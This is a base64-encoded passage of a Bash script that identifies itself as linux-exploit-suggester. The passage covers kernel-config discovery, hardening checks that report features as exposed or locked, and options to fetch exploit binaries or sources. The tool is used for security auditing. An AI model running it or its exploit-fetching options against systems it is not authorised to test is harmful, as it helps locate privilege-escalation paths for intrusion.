Mgc2tpcCBpZiBjaGVjayBpcyBub3QgYXBwbGljYWJsZSAoLWsgb3IgLS11bmFtZSBvciAtcCBtb2Rlcykgb3IgaWYgdXNlciBzYWlkIHNvICgtLXNraXAtbW9yZS1jaGVja3MpCiAgICAgICAgWyAiJG9wdF9za2lwX21vcmVfY2hlY2tzIiA9ICJ0cnVlIiBdICYmIHJldHVybiAwCgogICAgICAgIHN5c2N0bENvbmRpdGlvbj0iJHtJTjo3fSIKCiAgICAgICAgIyBleHRyYWN0IHN5c2N0bCBlbnRyeSwgcmVsYXRpb24gc2lnbiBhbmQgcmVxdWlyZWQgdmFsdWUKICAgICAgICBpZiBlY2hvICRzeXNjdGxDb25kaXRpb24gfCBncmVwIC1xaSAiIT0iOyB0aGVuCiAgICAgICAgICAgIHNpZ249IiE9IgogICAgICAgIGVsaWYgZWNobyAkc3lzY3RsQ29uZGl0aW9uIHwgZ3JlcCAtcWkgIj09IjsgdGhlbgogICAgICAgICAgICBzaWduPSI9PSIKICAgICAgICBlbHNlCiAgICAgICAgICAgIGV4aXRXaXRoRXJyTXNnICJXcm9uZyBzeXNjdGwgY29uZGl0aW9uLiBUaGVyZSBpcyBzeW50YXggZXJyb3IgaW4geW91ciBmZWF0dXJlcyBEQi4gQWJvcnRpbmcuIgogICAgICAgIGZpCiAgICAgICAgdmFsPSQoZWNobyAiJHN5c2N0bENvbmRpdGlvbiIgfCBhd2sgLUYgIiRzaWduIiAne3ByaW50ICQyfScpCiAgICAgICAgZW50cnk9JChlY2hvICIkc3lzY3RsQ29uZGl0aW9uIiB8IGF3ayAtRiAiJHNpZ24iICd7cHJpbnQgJDF9JykKCiAgICAgICAgIyBnZXQgY3VycmVudCBzZXR0aW5nIG9mIHN5c2N0bCBlbnRyeQogICAgICAgIGN1clZhbD0kKC9zYmluL3N5c2N0bCAtYSAyPiAvZGV2L251bGwgfCBncmVwICIkZW50cnkiIHwgYXdrIC1GJz0nICd7cHJpbnQgJDJ9JykKCiAgICAgICAgIyBzcGVjaWFsIGNhc2UgZm9yIC0tY2hlY2tzZWMgbW9kZTogcmV0dXJuIDIgaWYgdGhlcmUgaXMgbm8gc3VjaCBzd2l0Y2ggaW4gc3lzY3RsCiAgICAgICAgWyAteiAiJGN1clZhbCIgLWEgIiRvcHRfY2hlY2tzZWNfbW9kZSIgPSAidHJ1ZSIgXSAmJiByZXR1cm4gMgoKICAgICAgICAjIGZvciBvdGhlciBtb2Rlczogc2tpcCBpZiB0aGVyZSBpcyBubyBzdWNoIHN3aXRjaCBpbiBzeXNjdGwKICAgICAgICBbIC16ICIkY3VyVmFsIiBdICYmIHJldHVybiAwCgogICAgICAgICMgY29tcGFyZSAmIHJldHVybiByZXN1bHQKICAgICAgICBjb21wYXJlVmFsdWVzICRjdXJWYWwgJHZhbCAkc2lnbiAmJiByZXR1cm4gMAoKICAgIGVsaWYgW1sgIiRJTiIgPX4gXmNtZDouKiQgXV07IHRoZW4KCiAgICAgICAgIyBza2lwIGlmIGNoZWNrIGlzIG5vdCBhcHBsaWNhYmxlICgtayBvciAtLXVuYW1lIG9yIC1wIG1vZGVzKSBvciBpZiB1c2VyIHNhaWQgc28gKC0tc2tpcC1tb3JlLWNoZWNrcykKICAgICAgICBbICIkb3B0X3NraXBfbW9yZV9jaGVja3MiID0gInRydWUiIF0gJiYgcmV0dXJuIDAKCiAgICAgICAgY21kPSIke0lOOjR9IgogICAgICAgIGlmIGV2YWwgIiR7Y21kfSI7IHRoZW4KICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICBmaQogICAgZmkKCiAgICByZXR1cm4gMQp9CgpnZXRLZXJuZWxDb25maWcoKSB7CgogICAgaWYgWyAtZiAvcHJvYy9jb25maWcuZ3ogXSA7IHRoZW4KICAgICAgICBLQ09ORklHPSJ6Y2F0IC9wcm9jL2NvbmZpZy5neiIKICAgIGVsaWYgWyAtZiAvYm9vdC9jb25maWctYHVuYW1lIC1yYCBdIDsgdGhlbgogICAgICAgIEtDT05GSUc9ImNhdCAvYm9vdC9jb25maWctYHVuYW1lIC1yYCIKICAgIGVsaWYgWyAtZiAiJHtLQlVJTERfT1VUUFVUOi0vdXNyL3NyYy9saW51eH0iLy5jb25maWcgXSA7IHRoZW4KICAgICAgICBLQ09ORklHPSJjYXQgJHtLQlVJTERfT1VUUFVUOi0vdXNyL3NyYy9saW51eH0vLmNvbmZpZyIKICAgIGVsc2UKICAgICAgICBLQ09ORklHPSIiCiAgICBmaQp9CgpjaGVja3NlY01vZGUoKSB7CgogICAgTU9ERT0wCgogICAgIyBzdGFydCBhbmFseXNpcwpmb3IgRkVBVFVSRSBpbiAiJHtGRUFUVVJFU1tAXX0iOyBkbwoKICAgICMgY3JlYXRlIGFycmF5IGZyb20gY3VycmVudCBleHBsb2l0IGhlcmUgZG9jIGFuZCBmZXRjaCBuZWVkZWQgbGluZXMKICAgIGk9MAogICAgIyAoJy1yJyBpcyB1c2VkIHRvIG5vdCBpbnRlcnByZXQgYmFja3NsYXNoIHVzZWQgZm9yIGJhc2ggY29sb3JzKQogICAgd2hpbGUgcmVhZCAtciBsaW5lCiAgICBkbwogICAgICAgIGFycltpXT0iJGxpbmUiCiAgICAgICAgaT0kKChpICsgMSkpCiAgICBkb25lIDw8PCAiJEZFQVRVUkUiCgoJIyBtb2Rlczoga2VybmVsLWZlYXR1cmUgKDEpIHwgaHctZmVhdHVyZSAoMikgfCAzcmRwYXJ0eS1mZWF0dXJlICgzKSB8IGF0dGFjay1zdXJmYWNlICg0KQogICAgTkFNRT0iJHthcnJbMF19IgogICAgUFJFX05BTUU9IiR7TkFNRTowOjh9IgogICAgTkFNRT0iJHtOQU1FOjl9IgogICAgaWYgWyAiJHtQUkVfTkFNRX0iID0gInNlY3Rpb246IiBdOyB0aGVuCgkJIyBhZHZhbmNlIHRvIG5leHQgTU9ERQoJCU1PREU9JCgoJE1PREUgKyAxKSkKCiAgICAgICAgZWNobwogICAgICAgIGVjaG8gLWUgIiR7Ymxkd2h0fSR7TkFNRX0ke3R4dHJzdH0iCiAgICAgICAgZWNobwogICAgICAgIGNvbnRpbnVlCiAgICBmaQoKICAgIEFWQUlMQUJMRT0iJHthcnJbMV19IiAmJiBBVkFJTEFCTEU9IiR7QVZBSUxBQkxFOjExfSIKICAgIEVOQUJMRT0kKGVjaG8gIiRGRUFUVVJFIiB8IGdyZXAgImVuYWJsZWQ6ICIgfCBhd2sgLUYnZWQ6ICcgJ3twcmludCAkMn0nKQogICAgYW5hbHlzaXNfdXJsPSQoZWNobyAiJEZFQVRVUkUiIHwgZ3JlcCAiYW5hbHlzaXMtdXJsOiAiIHwgYXdrICd7cHJpbnQgJDJ9JykKCiAgICAjIHNwbGl0IGxpbmUgd2l0aCBhdmFpbGFiaWxpdHkgcmVxdWlyZW1lbnRzICYgbG9vcCB0aHJ1IGFsbCBhdmFpbGFiaWxpdHkgcmVxcyBvbmUgYnkgb25lICYgY2hlY2sgd2hldGhlciBpdCBpcyBtZXQKICAgIElGUz0nLCcgcmVhZCAtciAtYSBhcnJheSA8PDwgIiRBVkFJTEFCTEUiCiAgICBBVkFJTEFCTEVfUkVRU19OVU09JHsjYXJyYXlbQF19CiAgICBBVkFJTEFCTEVfUEFTU0VEX1JFUT0wCglDT05GSUc9IiIKICAgIGZvciBSRVEgaW4gIiR7YXJyYXlbQF19IjsgZG8KCgkJIyBmaW5kIENPTkZJR18gbmFtZSAoaWYgcHJlc2VudCkgZm9yIGN1cnJlbnQgZmVhdHVyZSAob25seSBmb3IgZGlzcGxheSBwdXJwb3NlcykKCQlpZiBbIC16ICIkQ09ORklHIiBdOyB0aGVuCgkJCWNvbmZpZz0kKGVjaG8gIiRSRVEiIHwgZ3JlcCAiQ09ORklHXyIpCgkJCVsgLW4gIiRjb25maWciIF0gJiYgQ09ORklHPSIoJChlY2hvICRSRVEgfCBjdXQgLWQnPScgLWYxKSkiCgkJZmkKCiAgICAgICAgaWYgKGNoZWNrUmVxdWlyZW1lbnQgIiRSRVEiKTsgdGhlbgogICAgICAgICAgICBBVkFJTEFCTEVfUEFTU0VEX1JFUT0kKCgkQVZBSUxBQkxFX1BBU1NFRF9SRVEgKyAxKSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZmkKICAgIGRvbmUKCiAgICAjIHNwbGl0IGxpbmUgd2l0aCBlbmFibGVtZW50IHJlcXVpcmVtZW50cyAmIGxvb3AgdGhydSBhbGwgZW5hYmxlbWVudCByZXFzIG9uZSBieSBvbmUgJiBjaGVjayB3aGV0aGVyIGl0IGlzIG1ldAogICAgRU5BQkxFX1BBU1NFRF9SRVE9MAogICAgRU5BQkxFX1JFUVNfTlVNPTAKICAgIG5vU3lzY3RsPTAKICAgIGlmIFsgLW4gIiRFTkFCTEUiIF07IHRoZW4KICAgICAgICBJRlM9JywnIHJlYWQgLXIgLWEgYXJyYXkgPDw8ICIkRU5BQkxFIgogICAgICAgIEVOQUJMRV9SRVFTX05VTT0keyNhcnJheVtAXX0KICAgICAgICBmb3IgUkVRIGluICIke2FycmF5W0BdfSI7IGRvCiAgICAgICAgICAgIGNtZFN0ZG91dD0kKGNoZWNrUmVxdWlyZW1lbnQgIiRSRVEiKQogICAgICAgICAgICByZXRWYWw9JD8KICAgICAgICAgICAgaWYgWyAkcmV0VmFsIC1lcSAwIF07IHRoZW4KICAgICAgICAgICAgICAgIEVOQUJMRV9QQVNTRURfUkVRPSQoKCRFTkFCTEVfUEFTU0VEX1JFUSArIDEpKQogICAgICAgICAgICBlbGlmIFsgJHJldFZhbCAtZXEgMiBdOyB0aGVuCiAgICAgICAgICAgICMgc3BlY2lhbCBjYXNlOiBzeXNjdGwgZW50cnkgaXMgbm90IHByZXNlbnQgb24gZ2l2ZW4gc3lzdGVtOiBzaWduYWwgaXQgYXM6IE4vQQogICAgICAgICAgICAgICAgbm9TeXNjdGw9MQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZmkKICAgICAgICBkb25lCiAgICBmaQoKICAgIGZlYXR1cmU9JChlY2hvICIkRkVBVFVSRSIgfCBncmVwICJmZWF0dXJlOiAiIHwgY3V0IC1kJyAnIC1mIDItKQoKICAgIGlmIFsgLW4gIiRjbWRTdGRvdXQiIF07IHRoZW4KICAgICAgICBpZiBbICRjbWRTdGRvdXQgLWVxIDAgXTsgdGhlbgogICAgICAgICAgICBzdGF0ZT0iWyAke3R4dHJlZH1TZXQgdG8gJGNtZFN0ZG91dCR7dHh0cnN0fSBdIgoJCQljbWRTdGRvdXQ9IiIKICAgICAgICBlbHNlCiAgICAgICAgICAgIHN0YXRlPSJbICR7dHh0Z3JufVNldCB0byAkY21kU3Rkb3V0JHt0eHRyc3R9IF0iCgkJCWNtZFN0ZG91dD0iIgogICAgICAgIGZpCiAgICBlbHNlCgoJdW5rbm93bj0iWyAke3R4dGdyYXl9VW5rbm93biR7dHh0cnN0fSAgXSIKCgkjIGZvciAzcmQgcGFydHkgKDMpIG1vZGUgZGlzcGxheSAiTi9BIiBvciAiRW5hYmxlZCIKCWlmIFsgJE1PREUgLWVxIDMgXTsgdGhlbgogICAgICAgICAgICBlbmFibGVkPSJbICR7dHh0Z3JufUVuYWJsZWQke3R4dHJzdH0gICBdIgogICAgICAgICAgICBkaXNhYmxlZD0iWyAgICR7dHh0Z3JheX1OL0Eke3R4dHJzdH0gICAgXSIKCiAgICAgICAgIyBmb3IgYXR0YWNrLXN1cmZhY2UgKDQpIG1vZGUgZGlzcGxheSAiTG9ja2VkIiBvciAiRXhwb3NlZCIKICAgICAgICBlbGlmIFsgJE1PREUgLWVxIDQgXTsgdGhlbgogICAgICAgICAgIGVuYWJsZWQ9IlsgJHt0eHRyZWR9RXhwb3NlZCR7dHh0cnN0fSAgXSIKICAgICAgICAgICBkaXNhYmxlZD0iWyAke3R4dGdybn1Mb2NrZWQke3R4dHJzdH0gICBdIgoKCSMgb3RoZXIgbW9kZXMiICJEaXNhYmxlZCIgLyAiRW5hYmxlZCIKCWVsc2UKCQllbmFibGVkPSJbICR7dHh0Z3JufUVuYWJsZWQke3R4dHJzdH0gIF0iCgkJZGlzYWJsZWQ9IlsgJHt0eHRyZWR9RGlzYWJsZWQke3R4dHJzdH0gXSIKCWZpCgoJaWYgWyAteiAiJEtDT05GSUciIC1hICIkRU5BQkxFX1JFUVNfTlVNIiA9IDAgXTsgdGhlbgoJICAgIHN0YXRlPSR1bmtub3duCiAgICBlbGlmIFsgJEFWQUlMQUJMRV9QQVNTRURfUkVRIC1lcSAkQVZBSUxBQkxFX1JFUVNfTlVNIC1hICRFTkFCTEVfUEFTU0VEX1JFUSAtZXEgJEVOQUJMRV9SRVFTX05VTSBdOyB0aGVuCiAgICAgICAgc3RhdGU9JGVuYWJsZWQKICAgIGVsc2UKICAgICAgICBzdGF0ZT0kZGlzYWJsZWQKCWZpCgogICAgZmkKCiAgICBlY2hvIC1lICIgJHN0YXRlICRmZWF0dXJlICR7d2h0fSR7Q09ORklHfSR7dHh0cnN0fSIKICAgIFsgLW4gIiRhbmFseXNpc191cmwiIF0gJiYgZWNobyAtZSAiICAgICAgICAgICAgICAkYW5hbHlzaXNfdXJsIgogICAgZWNobwoKZG9uZQoKfQoKZGlzcGxheUV4cG9zdXJlKCkgewogICAgUkFOSz0kMQoKICAgIGlmIFsgIiRSQU5LIiAtZ2UgNiBdOyB0aGVuCiAgICAgICAgZWNobyAiaGlnaGx5IHByb2JhYmxlIgogICAgZWxpZiBbICIkUkFOSyIgLWdlIDMgXTsgdGhlbgogICAgICAgIGVjaG8gInByb2JhYmxlIgogICAgZWxzZQogICAgICAgIGVjaG8gImxlc3MgcHJvYmFibGUiCiAgICBmaQp9CgojIHBhcnNlIGNvbW1hbmQgbGluZSBwYXJhbWV0ZXJzCkFSR1M9JChnZXRvcHQgLS1vcHRpb25zICRTSE9SVE9QVFMgIC0tbG9uZ29wdGlvbnMgJExPTkdPUFRTIC0tICIkQCIpClsgJD8gIT0gMCBdICYmIGV4aXRXaXRoRXJyTXNnICJBYm9ydGluZy4iCgpldmFsIHNldCAtLSAiJEFSR1MiCgp3aGlsZSB0cnVlOyBkbwogICAgY2FzZSAiJDEiIGluCiAgICAgICAgLXV8LS11bmFtZSkKICAgICAgICAgICAgc2hpZnQKICAgICAgICAgICAgVU5BTUVfQT0iJDEiCiAgICAgICAgICAgIG9wdF91bmFtZV9zdHJpbmc9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC1WfC0tdmVyc2lvbikKICAgICAgICAgICAgdmVyc2lvbgogICAgICAgICAgICBleGl0IDAKICAgICAgICAgICAgOzsKICAgICAgICAtaHwtLWhlbHApCiAgICAgICAgICAgIHVzYWdlIAogICAgICAgICAgICBleGl0IDAKICAgICAgICAgICAgOzsKICAgICAgICAtZnwtLWZ1bGwpCiAgICAgICAgICAgIG9wdF9mdWxsPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAtZ3wtLXNob3J0KQogICAgICAgICAgICBvcHRfc3VtbWFyeT10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgLWJ8LS1mZXRjaC1iaW5hcmllcykKICAgICAgICAgICAgb3B0X2ZldGNoX2JpbnM9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC1zfC0tZmV0Y2gtc291cmNlcykKICAgICAgICAgICAgb3B0X2ZldGNoX3NyY3M9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC1rfC0ta2VybmVsKQogICAgICAgICAgICBzaGlmdAogICAgICAgICAgICBLRVJORUw9IiQxIgogICAgICAgICAgICBvcHRfa2VybmVsX3ZlcnNpb249dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC1kfC0tc2hvdy1kb3MpCiAgICAgICAgICAgIG9wdF9zaG93X2Rvcz10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgLXB8LS1wa2dsaXN0LWZpbGUpCiAgICAgICAgICAgIHNoaWZ0CiAgICAgICAgICAgIFBLR0xJU1RfRklMRT0iJDEiCiAgICAgICAgICAgIG9wdF9wa2dsaXN0X2ZpbGU9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC0tY3ZlbGlzdC1maWxlKQogICAgICAgICAgICBzaGlmdAogICAgICAgICAgICBDVkVMSVNUX0ZJTEU9IiQxIgogICAgICAgICAgICBvcHRfY3ZlbGlzdF9maWxlPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAtLWNoZWNrc2VjKQogICAgICAgICAgICBvcHRfY2hlY2tzZWNfbW9kZT10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgLS1rZXJuZWxzcGFjZS1vbmx5KQogICAgICAgICAgICBvcHRfa2VybmVsX29ubHk9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC0tdXNlcnNwYWNlLW9ubHkpCiAgICAgICAgICAgIG9wdF91c2Vyc3BhY2Vfb25seT10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgLS1za2lwLW1vcmUtY2hlY2tzKQogICAgICAgICAgICBvcHRfc2tpcF9tb3JlX2NoZWNrcz10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgLS1za2lwLXBrZy12ZXJzaW9ucykKICAgICAgICAgICAgb3B0X3NraXBfcGtnX3ZlcnNpb25zPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAqKQogICAgICAgICAgICBzaGlmdAogICAgICAgICAgICBpZiBbICIkIyIgIT0gIjAiIF07IHRoZW4KICAgICAgICAgICAgICAgIGV4aXRXaXRoRXJyTXNnICJVbmtub3duIG9wdGlvbiAnJDEnLiBBYm9ydGluZy4iCiAgICAgICAgICAgIGZpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIDs7CiAgICBlc2FjCiAgICBzaGlmdApkb25lCgojIGNoZWNrIEJhc2ggdmVyc2lvbiAoYXNzb2NpYXRpdmUgYXJyYXlzIG5lZWQgQmFzaCBpbiB2ZXJzaW9uIDQuMCspCmlmICgoQkFTSF9WRVJTSU5GT1swXSA8IDQpKTsgdGhlbgogICAgZXhpdFdpdGhFcnJNc2cgIlNjcmlwdCBuZWVkcyBCYXNoIGluIHZlcnNpb24gNC4wIG9yIG5ld2VyLiBBYm9ydGluZy4iCmZpCgojIGV4aXQgaWYgYm90aCAtLWtlcm5lbCBhbmQgLS11bmFtZSBhcmUgc2V0ClsgIiRvcHRfa2VybmVsX3ZlcnNpb24iID0gInRydWUiIF0gJiYgWyAkb3B0X3VuYW1lX3N0cmluZyA9ICJ0cnVlIiBdICYmIGV4aXRXaXRoRXJyTXNnICJTd2l0Y2hlcyAtdXwtLXVuYW1lIGFuZCAta3wtLWtlcm5lbCBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCgojIGV4aXQgaWYgYm90aCAtLWZ1bGwgYW5kIC0tc2hvcnQgYXJlIHNldApbICIkb3B0X2Z1bGwiID0gInRydWUiIF0gJiYgWyAkb3B0X3N1bW1hcnkgPSAidHJ1ZSIgXSAmJiBleGl0V2l0aEVyck1zZyAiU3dpdGNoZXMgLWZ8LS1mdWxsIGFuZCAtZ3wtLXNob3J0IGFyZSBtdXR1YWxseSBleGNsdXNpdmUuIEFib3J0aW5nLiIKCiMgLS1jdmVsaXN0LWZpbGUgbW9kZSBpcyBzdGFuZGFsb25lIG1vZGUgYW5kIGlzIG5vdCBhcHBsaWNhYmxlIHdoZW4gb25lIG9mIC1rIHwgLXUgfCAtcCB8IC0tY2hlY2tzZWMgc3dpdGNoZXMgYXJlIHNldAppZiBbICIkb3B0X2N2ZWxpc3RfZmlsZSIgPSAidHJ1ZSIgXTsgdGhlbgogICAgWyAhIC1lICIkQ1ZFTElTVF9GSUxFIiBdICYmIGV4aXRXaXRoRXJyTXNnICJQcm92aWRlZCBDVkUgbGlzdCBmaWxlIGRvZXMgbm90IGV4aXN0cy4gQWJvcnRpbmcuIgogICAgWyAiJG9wdF9rZXJuZWxfdmVyc2lvbiIgPSAidHJ1ZSIgXSAmJiBleGl0V2l0aEVyck1zZyAiU3dpdGNoZXMgLWt8LS1rZXJuZWwgYW5kIC0tY3ZlbGlzdC1maWxlIGFyZSBtdXR1YWxseSBleGNsdXNpdmUuIEFib3J0aW5nLiIKICAgIFsgIiRvcHRfdW5hbWVfc3RyaW5nIiA9ICJ0cnVlIiBdICYmIGV4aXRXaXRoRXJyTXNnICJTd2l0Y2hlcyAtdXwtLXVuYW1lIGFuZCAtLWN2ZWxpc3QtZmlsZSBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCiAgICBbICIkb3B0X3BrZ2xpc3RfZmlsZSIgPSAidHJ1ZSIgXSAmJiBleGl0V2l0aEVyck1zZyAiU3dpdGNoZXMgLXB8LS1wa2dsaXN0LWZpbGUgYW5kIC0tY3ZlbGlzdC1maWxlIGFyZSBtdXR1YWxseSBleGNsdXNpdmUuIEFib3J0aW5nLiIKZmkKCiMgLS1jaGVja3NlYyBtb2RlIGlzIHN0YW5kYWxvbmUgbW9kZSBhbmQgaXMgbm90IGFwcGxpY2FibGUgd2hlbiBvbmUgb2YgLWsgfCAtdSB8IC1wIHwgLS1jdmVsaXN0LWZpbGUgc3dpdGNoZXMgYXJlIHNldAppZiBbICIkb3B0X2NoZWNrc2VjX21vZGUiID0gInRydWUiIF07IHRoZW4KICAgIFsgIiRvcHRfa2VybmVsX3ZlcnNpb24iID0gInRydWUiIF0gJiYgZXhpdFdpdGhFcnJNc2cgIlN3aXRjaGVzIC1rfC0ta2VybmVsIGFuZCAtLWNoZWNrc2VjIGFyZSBtdXR1YWxseSBleGNsdXNpdmUuIEFib3J0aW5nLiIKICAgIFsgIiRvcHRfdW5hbWVfc3RyaW5nIiA9ICJ0cnVlIiBdICYmIGV4aXRXaXRoRXJyTXNnICJTd2l0Y2hlcyAtdXwtLXVuYW1lIGFuZCAtLWNoZWNrc2VjIGFyZSBtdXR1YWxseSBleGNsdXNpdmUuIEFib3J0aW5nLiIKICAgIFsgIiRvcHRfcGtnbGlzdF9maWxlIiA9ICJ0cnVlIiBdICYmIGV4aXRXaXRoRXJyTXNnICJTd2l0Y2hlcyAtcHwtLXBrZ2xpc3QtZmlsZSBhbmQgLS1jaGVja3NlYyBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCmZpCgojIGV4dHJhY3Qga2VybmVsIHZlcnNpb24gYW5kIG90aGVyIE9TIGluZm8gbGlrZSBkaXN0cm8gbmFtZSwgZGlzdHJvIHZlcnNpb24sIGV0Yy4gMyBwb3NzaWJpbGl0aWVzIGhlcmU6CiMgY2FzZSAxOiAtLWtlcm5lbCBzZXQKaWYgWyAiJG9wdF9rZXJuZWxfdmVyc2lvbiIgPT0gInRydWUiIF07IHRoZW4KICAgICMgVE9ETzogYWRkIGtlcm5lbCB2ZXJzaW9uIG51bWJlciB2YWxpZGF0aW9uCiAgICBbIC16ICIkS0VSTkVMIiBdICYmIGV4aXRXaXRoRXJyTXNnICJVbnJlY29nbml6ZWQga2VybmVsIHZlcnNpb24gZ2l2ZW4uIEFib3J0aW5nLiIKICAgIEFSQ0g9IiIKICAgIE9TPSIiCgogICAgIyBkbyBub3QgcGVyZm9ybSBhZGRpdGlvbmFsIGNoZWNrcyBvbiBjdXJyZW50IG1hY2hpbmUKICAgIG9wdF9za2lwX21vcmVfY2hlY2tzPXRydWUKCiAgICAjIGRvIG5vdCBjb25zaWRlciBjdXJyZW50IE9TCiAgICBnZXRQa2dMaXN0ICIiICIkUEtHTElTVF9GSUxFIgoKIyBjYXNlIDI6IC0tdW5hbWUgc2V0CmVsaWYgWyAiJG9wdF91bmFtZV9zdHJpbmciID09ICJ0cnVlIiBdOyB0aGVuCiAgICBbIC16ICIkVU5BTUVfQSIgXSAmJiBleGl0V2l0aEVyck1zZyAidW5hbWUgc3RyaW5nIGVtcHR5LiBBYm9ydGluZy4iCiAgICBwYXJzZVVuYW1lICIkVU5BTUVfQSIKCiAgICAjIGRvIG5vdCBwZXJmb3JtIGFkZGl0aW9uYWwgY2hlY2tzIG9uIGN1cnJlbnQgbWFjaGluZQogICAgb3B0X3NraXBfbW9yZV9jaGVja3M9dHJ1ZQoKICAgICMgZG8gbm90IGNvbnNpZGVyIGN1cnJlbnQgT1MKICAgIGdldFBrZ0xpc3QgIiIgIiRQS0dMSVNUX0ZJTEUiCgojIGNhc2UgMzogLS1jdmVsaXN0LWZpbGUgbW9kZQplbGlmIFsgIiRvcHRfY3ZlbGlzdF9maWxlIiA9ICJ0cnVlIiBdOyB0aGVuCgogICAgIyBnZXQga2VybmVsIGNvbmZpZ3VyYXRpb24gaW4gdGhpcyBtb2RlCiAgICBbICIkb3B0X3NraXBfbW9yZV9jaGVja3MiID0gImZhbHNlIiBdICYmIGdldEtlcm5lbENvbmZpZwoKIyBjYXNlIDQ6IC0tY2hlY2tzZWMgbW9kZQplbGlmIFsgIiRvcHRfY2hlY2tzZWNfbW9kZSIgPSAidHJ1ZSIgXTsgdGhlbgoKICAgICMgdGhpcyBzd2l0Y2ggaXMgbm90IGFwcGxpY2FibGUgaW4gdGhpcyBtb2RlCiAgICBvcHRfc2tpcF9tb3JlX2NoZWNrcz1mYWxzZQoKICAgICMgZ2V0IGtlcm5lbCBjb25maWd1cmF0aW9uIGluIHRoaXMgbW9kZQogICAgZ2V0S2VybmVsQ29uZmlnCiAgICBbIC16ICIkS0NPTkZJRyIgXSAmJiBlY2hvICJXQVJOSU5HLiBLZXJuZWwgQ29uZmlnIG5vdCBmb3VuZCBvbiB0aGUgc3lzdGVtIHJlc3VsdHMgd29uJ3QgYmUgY29tcGxldGUuIgoKICAgICMgbGF1bmNoIGNoZWNrc2VjIG1vZGUKICAgIGNoZWNrc2VjTW9kZQoKICAgIGV4aXQgMAoKIyBjYXNlIDU6IG5vIC0tdW5hbWUgfCAtLWtlcm5lbCB8IC0tY3ZlbGlzdC1maWxlIHwgLS1jaGVja3NlYyBzZXQKZWxzZQoKICAgICMgLS1wa2dsaXN0LWZpbGUgTk9UIHByb3ZpZGVkOiB0YWtlIGFsbCBpbmZvIGZyb20gY3VycmVudCBtYWNoaW5lCiAgICAjIGNhc2UgZm9yIHZhbmlsbGEgZXhlY3V0aW9uOiAuL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVyLnNoCiAgICBpZiBbICIkb3B0X3BrZ2xpc3RfZmlsZSIgPT0gImZhbHNlIiBdOyB0aGVuCiAgICAgICAgVU5BTUVfQT0kKHVuYW1lIC1hKQogICAgICAgIFsgLXogIiRVTkFNRV9BIiBdICYmIGV4aXRXaXRoRXJyTXNnICJ1bmFtZSBzdHJpbmcgZW1wdHkuIEFib3J0aW5nLiIKICAgICAgICBwYXJzZVVuYW1lICIkVU5BTUVfQSIKCiAgICAgICAgIyBnZXQga2VybmVsIGNvbmZpZ3VyYXRpb24gaW4gdGhpcyBtb2RlCiAgICAgICAgWyAiJG9wdF9za2lwX21vcmVfY2hlY2tzIiA9ICJmYWxzZSIgXSAmJiBnZXRLZXJuZWxDb25maWcKCiAgICAgICAgIyBleHRyYWN0IGRpc3RyaWJ1dGlvbiB2ZXJzaW9uIGZyb20gL2V0Yy9vcy1yZWxlYXNlIE9SIC9ldGMvbHNiLXJlbGVhc2UKICAgICAgICBbIC1uICIkT1MiIC1hICIkb3B0X3NraXBfbW9yZV9jaGVja3MiID0gImZhbHNlIiBdICYmIERJU1RSTz0kKGdyZXAgLXMgLUUgJ15ESVNUUklCX1JFTEVBU0U9fF5WRVJTSU9OX0lEPScgL2V0Yy8qLXJlbGVhc2UgfCBjdXQgLWQnPScgLWYyIHwgaGVhZCAtMSB8IHRyIC1kICciJykKCiAgICAgICAgIyBleHRyYWN0IHBhY2thZ2UgbGlzdGluZyBmcm9tIGN1cnJlbnQgT1MKICAgICAgICBnZXRQa2dMaXN0ICIkT1MiICIiCgogICAgIyAtLXBrZ2xpc3QtZmlsZSBwcm92aWRlZDogb25seSBjb25zaWRlciB1c2Vyc3BhY2UgZXhwbG9pdHMgYWdhaW5zdCBwcm92aWRlZCBwYWNrYWdlIGxpc3RpbmcKICAgIGVsc2UKICAgICAgICBLRVJORUw9IiIKICAgICAgICAjVE9ETzogZXh0cmFjdCBtYWNoaW5lIGFyY2ggZnJvbSBwYWNrYWdlIGxpc3RpbmcKICAgICAgICBBUkNIPSIiCiAgICAgICAgdW5zZXQgRVhQTE9JVFMKICAgICAgICBkZWNsYXJlIC1BIEVYUExPSVRTCiAgICAgICAgZ2V0UGtnTGlzdCAiIiAiJFBLR0xJU1RfRklMRSIKCiAgICAgICAgIyBhZGRpdGlvbmFsIGNoZWNrcyBhcmUgbm90IGFwcGxpY2FibGUgZm9yIHRoaXMgbW9kZQogICAgICAgIG9wdF9za2lwX21vcmVfY2hlY2tzPXRydWUKICAgIGZpCmZpCgplY2hvCmVjaG8gLWUgIiR7Ymxkd2h0fUF2YWlsYWJsZSBpbmZvcm1hdGlvbjoke3R4dHJzdH0iCmVjaG8KWyAtbiAiJEtFUk5FTCIgXSAmJiBlY2hvIC1lICJLZXJuZWwgdmVyc2lvbjogJHt0eHRncm59JEtFUk5FTCR7dHh0cnN0fSIgfHwgZWNobyAtZSAiS2VybmVsIHZlcnNpb246ICR7dHh0cmVkfU4vQSR7dHh0cnN0fSIKZWNobyAiQXJjaGl0ZWN0dXJlOiAkKFsgLW4gIiRBUkNIIiBdICYmIGVjaG8gLWUgIiR7dHh0Z3JufSRBUkNIJHt0eHRyc3R9IiB8fCBlY2hvIC1lICIke3R4dHJlZH1OL0Eke3R4dHJzdH0iKSIKZWNobyAiRG